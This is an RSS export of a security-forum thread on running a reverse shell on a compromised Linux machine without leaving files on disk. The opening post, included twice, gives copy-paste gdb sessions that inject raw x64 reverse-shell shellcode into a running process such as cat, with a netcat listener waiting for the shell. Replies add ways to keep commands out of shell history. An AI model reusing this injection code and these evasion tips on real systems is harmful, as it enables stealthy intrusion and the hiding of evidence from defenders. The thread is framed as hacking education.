@@ -1,0 +1,398 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Running binaries without leaving tracks</title>
+    <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166</link>
+    <description>Continuing the discussion from [Spawning reverse shells](https://0x00sec.org/t/spawning-reverse-shells/2133/8):
+
+I was about to reply on (https://0x00sec.org/t/spawning-reverse-shells/2133/8), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue.
+
+The discussion here, is about how to run a reverse shell in a compromised machine without dropping anything on the local storage (whatever it is). 
+
+The original article describes how to solve the problem using existing tools in the machine. Then, in the comments I propose to drop a remote shell using the `echo` technique (or the __Chuck Norris way__ if you prefer:). This technique requires to drop a binary somewhere in the disk before running it. So the following question arose:
+
+__Can we run a binary without first dropping it into the local storage?__
+
+There are a few posibilities but, they will only work under certain specific circunstances. What is described below is not an universal solution but just more alternatives for different situations.
+
+# Option 1. Memory File Systems
+This is the simplest option. You can drop your program in `/run/shm` or `/dev/shm`. This is actually memory what means that the binary is not begin actually saved in any storage device. However, this has some limitations.
+
+First, those mount points are usually configured with the `noexec` flag. This means that you cannot execute programs stored in those folders :frowning: . If you have root access, then you can remount them without that flag.
+
+Second, the binary will be in memory. This means that, a reboot should clean everything up without leaving any track of what happened. However, while the machine is up, the file will be there. Even if we delete it after execution, the binary can still be recovered just dumping the `exe` folder from its associated `/proc` entry:
+
+`cat /proc/PID/exe &gt; orignal_binary`
+
+# Option 2. Evil Kernel Module
+This actually implies that the machine have been severely compromised and you have dropped a file (the kernel module) in advance. From kernel space you should have full control of the machine and be able to get code from anywhere, put it in memory at any location you want and run it.
+
+Haven&#39;t tried this so I do not know how difficult it is.
+
+I do not know either whether you will ever see this option in the real world. If somebody has compromised a machine to be able to drop a kernel module, then... you just drop a rootkit and hide whatever you want.
+
+However, note that if the _malware_ is hidden with a rootkit, it is trivial to recover the binary for analysis (just connect the HD to a different machine and mounted the disk from a clean system).
+
+# Option 3. Abusing gdb
+Without diving into the kernel, the only way (to my knowledge) to get code executed without using a binary on the disk (under GNU/Linux) is to use the `ptrace` system call. This way you can attach to any process (as far as it does not have anti-debug code), modify its text segment with your code and restart execution at a convenient place.
+
+This is roughly what is described in this paper:
+
+https://0x00sec.org/t/linux-infecting-running-processes/1097
+
+So, if `gdb` is available in the target machine, you can do all this from `gdb` just _typing_ the proper sequence of commands. Note that this will imply to _type_  the machine code :).
+
+Of course, you will not type this, you&#39;d either copy&amp;paste or feed it through whatever interface you are using the get shell access to the machine... 
+
+So, for educational purposes here is a PoC. The Shellcode comes from (https://modexp.wordpress.com/2016/03/31/x64-shellcodes-linux/):
+
+```
+nc -v -l 1234 # Attacker
+# Victim
+$ gdb /bin/cat
+(gdb) set follow-exec-mode new
+(gdb) r
+Starting program: /bin/cat
+^C
+Program received signal SIGINT, Interrupt.
+0x00007ffff7b01eb0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
+82	../sysdeps/unix/syscall-template.S: No such file or directory.
+(gdb) set (char[66]) *0x7ffff7b01eb0  = {0x48,0xb8,0xfd,0xff,0xfb,0x2d,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd0,0x50,0x54,0x6a,0x29,0x58,0x6a,0x01,0x5e,0x6a,0x02,0x5f,0x99,0x0f,0x05,0x97,0x96,0xb0,0x21,0x0f,0x05,0x83,0xee,0x01,0x79,0xf7,0x5e,0xb2,0x10,0xb0,0x2a,0x0f,0x05,0x99,0x52,0x5e,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0xb0,0x3b,0x0f,0x05}
+(gdb) c
+Continuing.
+&lt;PRESS ENTER HERE&gt;
+process 4142 is executing new program: /bin/dash
+```
+A couple of comments:
+
+* The `set follow-exec-mode new` command at the beginning is just to avoid `gdb` to get control back after `execing` the shell. If not used you just need to issue the command `c` (`continue`) again.
+* `gdb` will be visible in the list of active processes which is suspicious.
+* This technique could be applied to a running process, but in that case you need root access in order to attach to a process that is not your child
+
+# Option 4. More gdb abusing
+
+For this last scenario, when you have root access, you can just attach to a running process, modify it and leave it running. This is how it would look like:
+
+```
+nc -v -l 1234 # Attacker
+# Victim1
+$ cat   # Target process, can be something already running
+
+# Victim2
+$ pidof cat
+4637
+$ sudo gdb -p 4637
+Attaching to process 4637
+Reading symbols from /bin/cat...(no debugging symbols found)...done.
+Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/libc-2.15.so...done.
+done.
+Loaded symbols for /lib/x86_64-linux-gnu/libc.so.6
+Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/ld-2.15.so...done.
+done.
+Loaded symbols for /lib64/ld-linux-x86-64.so.2
+0x00007f4360138eb0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
+82	../sysdeps/unix/syscall-template.S: No such file or directory.
+
+(gdb)  set (int[17])*(int*)$rip = { 0xfffdb848, 0xff802dfb, 0xf748feff, 0x6a5450d0, 0x16a5829, 0x5f026a5e, 0x97050f99, 0xf21b096, 0x1ee8305, 0xb25ef779, 0xf2ab010, 0x5e529905, 0x2fb94852, 0x2f6e6962, 0x5168732f, 0x3bb05f54, 0x0000050f}
+(gdb) detach
+Detaching from program: /bin/cat, process 4637
+(gdb) q
+```
+
+This time, I&#39;m poking the data with a different command. It is  a bit more convenient as I uses the `rip` register value (that already holds an address suitable for our purposes) and dumps double words instead of bytes... Just another way of doing it.
+
+Now, you can  press enter in the session where you run `cat` and get your reverse shell on the `netcat` server.
+
+We have to press `ENTER` in both cases, because `cat` is blocked in a `read` to get data from `stdin`. Pressing `ENTER` will finish the system call and actually run the code we have injected... Well, at least, this is what I think is happening (see the `__read_nocancel` reference above). If I&#39;m wrong, please do not hesitate to correct me.
+
+The process list will just show the already existing `cat` process. However it is no longer a `cat` it is now our _doggy_ reverse shell. However, the connection will be visible through `netstat` or `lsof`.
+
+What we have just done is similar to the _meterpreter process migration capabilities_. It works a bit different in Windows, but, as far as I know, the concept is the same.... 
+
+As a final comment, it may be possible to do all this if there is an exploit that can be used against the target machine. In that case, the exploit payload can already be the remote shell or a loader (the meterpreter way) that can allocate memory and load code transferred through the active connection.
+
+
+# Are you Bored?
+So you are bored to dead and desperately looking for projects to do and sharp your skills. Goodl!. These are some things you can try:
+
+* Try to reproduce this using a remote exploit. You can take the vulnerable server from https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440 to get started
+* Try not to destroy the binary. This requires: 
+  * to get a copy of the victim process state and of the original code we overwrite during the injection process
+  * to modify the payload to start a thread (or a process) to run our code
+  * to restore the original code as well as its state and restore the original execution
+
+Hack fun!</description>
+    
+    <lastBuildDate>Sat, 03 Jun 2017 07:54:37 +0000</lastBuildDate>
+    <category>Linux</category>
+    <atom:link href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/13">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/13</link>
+        <pubDate>Sun, 21 Jan 2018 00:36:57 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-13</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>You found a way. That is so good.</p>
+<p>This kind of attack would be really cool with a rubber ducky.</p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/12">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/12</link>
+        <pubDate>Sat, 03 Jun 2017 07:43:28 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-12</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote no-group" data-username="kowalski" data-post="10" data-topic="2166">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/kowalski/48/1711_2.png" class="avatar"> kowalski:</div>
+<blockquote>
+<p>This should also be kept in mind: tmpfs filesystems by default are given around 50% of the RAM, and they’re mapped to swap by default, so once you fill it up to its capacity, it may start to write to your swap partition if you have one, and that will actually write to your disk.</p>
+</blockquote>
+</aside>
+<p>Haven’t thought about that. It is a very good point. There are a couple of things to check before dumping stuff in a tmpfs!. Thanks for the great comments</p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/11">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/11</link>
+        <pubDate>Fri, 02 Jun 2017 18:41:36 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-11</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[kowalski]]></dc:creator>
+        <description><![CDATA[
+            <p>Right, some distros choose to go against what upstream suggests, usually (then they run scripts to purge it when shutting down, or they don’t). Somtimes, the admin may configure it to be on the disk, or have it mounted with noexec by putting an entry in fstab or something of that kind.</p>
+<p>This should also be kept in mind: tmpfs filesystems by default are given around 50% of the RAM, and they’re mapped to swap by default, so once you fill it up to its capacity, it may start to write to your swap partition if you have one, and that will actually write to your disk.</p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/10</link>
+        <pubDate>Fri, 02 Jun 2017 18:37:27 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-10</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
+        <description><![CDATA[
+            <p>I don’t blame those two at all. I’m happy one of my articles led to such an interesting discussion.<br>
+That’s what these articles are for in the first place right?</p>
+<pre><code>Reading - Understanding - Discussing</code></pre>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/9</link>
+        <pubDate>Fri, 02 Jun 2017 18:33:36 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-9</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>You article was great as it was the starting point for some interesting discussions… blame <a class="mention" href="https://d.clarkee.co.uk/u/pry0cc">@pry0cc</a> and <a class="mention" href="https://d.clarkee.co.uk/u/ioth1nkn0t">@IoTh1nkN0t</a> for pushing this farther <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/8</link>
+        <pubDate>Fri, 02 Jun 2017 18:26:10 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-8</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>I think you are right, and it usually does not have the <code>noexec</code> flag set. However, sometime it is mounted on the disk so it is better to first check. <code>/dev/sdm</code> and <code>/run/shm</code> are always memory based.</p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/7</link>
+        <pubDate>Fri, 02 Jun 2017 18:24:01 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-7</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote no-group" data-username="0x00pf" data-post="1" data-topic="2166">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/0x00pf/48/13708_2.png" class="avatar"> 0x00pf:</div>
+<blockquote>
+<p>I was about to reply on (<a href="https://0x00sec.org/t/spawning-reverse-shells/2133/8">https://0x00sec.org/t/spawning-reverse-shells/2133/8</a>), but my reply has got so long that I decided to made it into a post. Please first read the original thread from <a class="mention" href="https://d.clarkee.co.uk/u/ricksanchez">@RickSanchez</a> and the comments there, before you continue.</p>
+</blockquote>
+</aside>
+<p><a class="mention" href="https://d.clarkee.co.uk/u/0x00pf">@0x00pf</a> yes mention and “praise” me more for my awesome topic. go on. don’t stop yet.</p>
+<p>nah mate awesome “reply” to the question which evolved on my thread the last days. I’ll cross link this article there too, so finding it will be easy.</p>
+<p>Back to topic now. This brings the topic of spawning a reverse shell on a whole different level actually.<br>
+My article dealt with the basic things one can tinker and play around with, but you decided to bring the super stealthy as fuck option right away <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"> <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/6</link>
+        <pubDate>Fri, 02 Jun 2017 18:03:33 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-6</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[kowalski]]></dc:creator>
+        <description><![CDATA[
+            <p>You can also use <code>set +o history</code> to turn it off and <code>set -o history</code> to turn it back on. <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/5</link>
+        <pubDate>Fri, 02 Jun 2017 17:59:34 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-5</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[kowalski]]></dc:creator>
+        <description><![CDATA[
+            <p><a class="mention" href="https://d.clarkee.co.uk/u/0x00pf">@0x00pf</a> Can’t we use /tmp for this purpose, the common mount options enabled on most Linux systems today by default (since they run systemd, which mounts /tmp as tmpfs afaict, or unless configured otherwise) are rw, nosuid and nodev. /tmp is tmpfs so writing here won’t make changes to the disk. What do you think? I’ve seen this directory being used by processes for IPC sometimes. The changes here are lost on every reboot.</p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/4</link>
+        <pubDate>Fri, 02 Jun 2017 17:50:03 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-4</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>That’s a nice trick. Thanks for sharing <a class="mention" href="https://d.clarkee.co.uk/u/smartone">@SmartOne</a></p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/3</link>
+        <pubDate>Fri, 02 Jun 2017 17:35:16 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-3</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[SmartOne]]></dc:creator>
+        <description><![CDATA[
+            <p>Great article! However, be sure to leave a space before the commands in order to make sure that they aren’t saved to the (bash) history <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/2</link>
+        <pubDate>Fri, 02 Jun 2017 16:30:52 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-2</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+      <item>
+        <title>Running binaries without leaving tracks</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>Continuing the discussion from <a href="https://0x00sec.org/t/spawning-reverse-shells/2133/8" rel="noopener nofollow ugc">Spawning reverse shells</a>:</p>
+<p>I was about to reply on (<a href="https://0x00sec.org/t/spawning-reverse-shells/2133/8" rel="noopener nofollow ugc">https://0x00sec.org/t/spawning-reverse-shells/2133/8</a>), but my reply has got so long that I decided to made it into a post. Please first read the original thread from <a class="mention" href="https://d.clarkee.co.uk/u/ricksanchez">@RickSanchez</a> and the comments there, before you continue.</p>
+<p>The discussion here, is about how to run a reverse shell in a compromised machine without dropping anything on the local storage (whatever it is).</p>
+<p>The original article describes how to solve the problem using existing tools in the machine. Then, in the comments I propose to drop a remote shell using the <code>echo</code> technique (or the <strong>Chuck Norris way</strong> if you prefer:). This technique requires to drop a binary somewhere in the disk before running it. So the following question arose:</p>
+<p><strong>Can we run a binary without first dropping it into the local storage?</strong></p>
+<p>There are a few posibilities but, they will only work under certain specific circunstances. What is described below is not an universal solution but just more alternatives for different situations.</p>
+<h1><a name="p-9875-option-1-memory-file-systems-1" class="anchor" href="https://d.clarkee.co.uk#p-9875-option-1-memory-file-systems-1"></a>Option 1. Memory File Systems</h1>
+<p>This is the simplest option. You can drop your program in <code>/run/shm</code> or <code>/dev/shm</code>. This is actually memory what means that the binary is not begin actually saved in any storage device. However, this has some limitations.</p>
+<p>First, those mount points are usually configured with the <code>noexec</code> flag. This means that you cannot execute programs stored in those folders <img src="https://d.clarkee.co.uk/images/emoji/twitter/frowning.png?v=15" title=":frowning:" class="emoji" alt=":frowning:" loading="lazy" width="20" height="20"> . If you have root access, then you can remount them without that flag.</p>
+<p>Second, the binary will be in memory. This means that, a reboot should clean everything up without leaving any track of what happened. However, while the machine is up, the file will be there. Even if we delete it after execution, the binary can still be recovered just dumping the <code>exe</code> folder from its associated <code>/proc</code> entry:</p>
+<p><code>cat /proc/PID/exe &gt; orignal_binary</code></p>
+<h1><a name="p-9875-option-2-evil-kernel-module-2" class="anchor" href="https://d.clarkee.co.uk#p-9875-option-2-evil-kernel-module-2"></a>Option 2. Evil Kernel Module</h1>
+<p>This actually implies that the machine have been severely compromised and you have dropped a file (the kernel module) in advance. From kernel space you should have full control of the machine and be able to get code from anywhere, put it in memory at any location you want and run it.</p>
+<p>Haven’t tried this so I do not know how difficult it is.</p>
+<p>I do not know either whether you will ever see this option in the real world. If somebody has compromised a machine to be able to drop a kernel module, then… you just drop a rootkit and hide whatever you want.</p>
+<p>However, note that if the <em>malware</em> is hidden with a rootkit, it is trivial to recover the binary for analysis (just connect the HD to a different machine and mounted the disk from a clean system).</p>
+<h1><a name="p-9875-option-3-abusing-gdb-3" class="anchor" href="https://d.clarkee.co.uk#p-9875-option-3-abusing-gdb-3"></a>Option 3. Abusing gdb</h1>
+<p>Without diving into the kernel, the only way (to my knowledge) to get code executed without using a binary on the disk (under GNU/Linux) is to use the <code>ptrace</code> system call. This way you can attach to any process (as far as it does not have anti-debug code), modify its text segment with your code and restart execution at a convenient place.</p>
+<p>This is roughly what is described in this paper:</p>
+<p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097" class="onebox" target="_blank" rel="noopener nofollow ugc">https://0x00sec.org/t/linux-infecting-running-processes/1097</a></p>
+<p>So, if <code>gdb</code> is available in the target machine, you can do all this from <code>gdb</code> just <em>typing</em> the proper sequence of commands. Note that this will imply to <em>type</em>  the machine code :).</p>
+<p>Of course, you will not type this, you’d either copy&amp;paste or feed it through whatever interface you are using the get shell access to the machine…</p>
+<p>So, for educational purposes here is a PoC. The Shellcode comes from (<a href="https://modexp.wordpress.com/2016/03/31/x64-shellcodes-linux/" rel="noopener nofollow ugc">https://modexp.wordpress.com/2016/03/31/x64-shellcodes-linux/</a>):</p>
+<pre><code class="lang-auto">nc -v -l 1234 # Attacker
+# Victim
+$ gdb /bin/cat
+(gdb) set follow-exec-mode new
+(gdb) r
+Starting program: /bin/cat
+^C
+Program received signal SIGINT, Interrupt.
+0x00007ffff7b01eb0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
+82	../sysdeps/unix/syscall-template.S: No such file or directory.
+(gdb) set (char[66]) *0x7ffff7b01eb0  = {0x48,0xb8,0xfd,0xff,0xfb,0x2d,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd0,0x50,0x54,0x6a,0x29,0x58,0x6a,0x01,0x5e,0x6a,0x02,0x5f,0x99,0x0f,0x05,0x97,0x96,0xb0,0x21,0x0f,0x05,0x83,0xee,0x01,0x79,0xf7,0x5e,0xb2,0x10,0xb0,0x2a,0x0f,0x05,0x99,0x52,0x5e,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0xb0,0x3b,0x0f,0x05}
+(gdb) c
+Continuing.
+&lt;PRESS ENTER HERE&gt;
+process 4142 is executing new program: /bin/dash
+</code></pre>
+<p>A couple of comments:</p>
+<ul>
+<li>The <code>set follow-exec-mode new</code> command at the beginning is just to avoid <code>gdb</code> to get control back after <code>execing</code> the shell. If not used you just need to issue the command <code>c</code> (<code>continue</code>) again.</li>
+<li><code>gdb</code> will be visible in the list of active processes which is suspicious.</li>
+<li>This technique could be applied to a running process, but in that case you need root access in order to attach to a process that is not your child</li>
+</ul>
+<h1><a name="p-9875-option-4-more-gdb-abusing-4" class="anchor" href="https://d.clarkee.co.uk#p-9875-option-4-more-gdb-abusing-4"></a>Option 4. More gdb abusing</h1>
+<p>For this last scenario, when you have root access, you can just attach to a running process, modify it and leave it running. This is how it would look like:</p>
+<pre><code class="lang-auto">nc -v -l 1234 # Attacker
+# Victim1
+$ cat   # Target process, can be something already running
+
+# Victim2
+$ pidof cat
+4637
+$ sudo gdb -p 4637
+Attaching to process 4637
+Reading symbols from /bin/cat...(no debugging symbols found)...done.
+Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/libc-2.15.so...done.
+done.
+Loaded symbols for /lib/x86_64-linux-gnu/libc.so.6
+Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/ld-2.15.so...done.
+done.
+Loaded symbols for /lib64/ld-linux-x86-64.so.2
+0x00007f4360138eb0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
+82	../sysdeps/unix/syscall-template.S: No such file or directory.
+
+(gdb)  set (int[17])*(int*)$rip = { 0xfffdb848, 0xff802dfb, 0xf748feff, 0x6a5450d0, 0x16a5829, 0x5f026a5e, 0x97050f99, 0xf21b096, 0x1ee8305, 0xb25ef779, 0xf2ab010, 0x5e529905, 0x2fb94852, 0x2f6e6962, 0x5168732f, 0x3bb05f54, 0x0000050f}
+(gdb) detach
+Detaching from program: /bin/cat, process 4637
+(gdb) q
+</code></pre>
+<p>This time, I’m poking the data with a different command. It is  a bit more convenient as I uses the <code>rip</code> register value (that already holds an address suitable for our purposes) and dumps double words instead of bytes… Just another way of doing it.</p>
+<p>Now, you can  press enter in the session where you run <code>cat</code> and get your reverse shell on the <code>netcat</code> server.</p>
+<p>We have to press <code>ENTER</code> in both cases, because <code>cat</code> is blocked in a <code>read</code> to get data from <code>stdin</code>. Pressing <code>ENTER</code> will finish the system call and actually run the code we have injected… Well, at least, this is what I think is happening (see the <code>__read_nocancel</code> reference above). If I’m wrong, please do not hesitate to correct me.</p>
+<p>The process list will just show the already existing <code>cat</code> process. However it is no longer a <code>cat</code> it is now our <em>doggy</em> reverse shell. However, the connection will be visible through <code>netstat</code> or <code>lsof</code>.</p>
+<p>What we have just done is similar to the <em>meterpreter process migration capabilities</em>. It works a bit different in Windows, but, as far as I know, the concept is the same…</p>
+<p>As a final comment, it may be possible to do all this if there is an exploit that can be used against the target machine. In that case, the exploit payload can already be the remote shell or a loader (the meterpreter way) that can allocate memory and load code transferred through the active connection.</p>
+<h1><a name="p-9875-are-you-bored-5" class="anchor" href="https://d.clarkee.co.uk#p-9875-are-you-bored-5"></a>Are you Bored?</h1>
+<p>So you are bored to dead and desperately looking for projects to do and sharp your skills. Goodl!. These are some things you can try:</p>
+<ul>
+<li>Try to reproduce this using a remote exploit. You can take the vulnerable server from <a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440" rel="noopener nofollow ugc">https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440</a> to get started</li>
+<li>Try not to destroy the binary. This requires:
+<ul>
+<li>to get a copy of the victim process state and of the original code we overwrite during the injection process</li>
+<li>to modify the payload to start a thread (or a process) to run our code</li>
+<li>to restore the original code as well as its state and restore the original execution</li>
+</ul>
+</li>
+</ul>
+<p>Hack fun!</p>
+          <p><a href="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166/1</link>
+        <pubDate>Fri, 02 Jun 2017 16:16:12 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-2166-1</guid>
+        <source url="https://d.clarkee.co.uk/t/running-binaries-without-leaving-tracks/2166.rss">Running binaries without leaving tracks</source>
+      </item>
+  </channel>
+</rss>
